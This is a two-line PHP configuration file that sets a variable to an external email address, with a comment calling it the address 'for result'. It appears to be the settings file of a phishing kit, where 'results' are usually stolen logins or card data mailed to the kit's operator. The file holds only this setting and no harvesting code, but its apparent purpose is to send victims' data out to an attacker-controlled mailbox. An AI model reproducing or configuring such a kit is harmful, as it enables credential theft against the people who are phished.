<?php
$send="ckiaresults@yandex.com"// your email address for result
?>